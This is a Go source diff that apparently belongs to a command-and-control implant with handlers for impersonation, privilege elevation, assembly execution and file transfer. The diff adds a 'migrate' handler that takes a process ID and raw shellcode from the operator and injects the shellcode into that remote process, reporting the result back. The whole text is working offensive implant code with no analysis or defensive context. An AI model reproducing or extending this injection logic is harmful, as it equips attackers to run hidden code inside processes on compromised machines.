@@ -21,11 +21,11 @@ var (
 		pb.MsgImpersonateReq:     impersonateHandler,
 		pb.MsgElevateReq:         elevateHandler,
 		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
+		pb.MsgMigrateReq:         migrateHandler,
 
 		// Generic
 		pb.MsgPsReq: psHandler,
 		pb.MsgPing:  pingHandler,
-		//pb.MsgKill:        killHandler,
 		pb.MsgLsReq:       dirListHandler,
 		pb.MsgDownloadReq: downloadHandler,
 		pb.MsgUploadReq:   uploadHandler,
@@ -106,4 +106,35 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 	data, err = proto.Marshal(execResp)
 	resp(data, err)
 
+}
+
+func migrateHandler(data []byte, resp RPCResponse) {
+	// {{if .Debug}}
+	log.Println("migrateHandler: RemoteTask called")
+	// {{end}}
+	migrateReq := &pb.MigrateReq{}
+	err := proto.Unmarshal(data, migrateReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Shellcode)
+	// {{if .Debug}}
+	log.Println("migrateHandler: RemoteTask called")
+	// {{end}}
+	migrateResp := &pb.Migrate{
+		Success: true,
+		Err:     "",
+	}
+	if err != nil {
+		migrateResp.Success = false
+		migrateResp.Err = err.Error()
+		// {{if .Debug}}
+		log.Println("migrateHandler: RemoteTask failed:", err)
+		// {{end}}
+	}
+	data, err = proto.Marshal(migrateResp)
+	resp(data, err)
 }
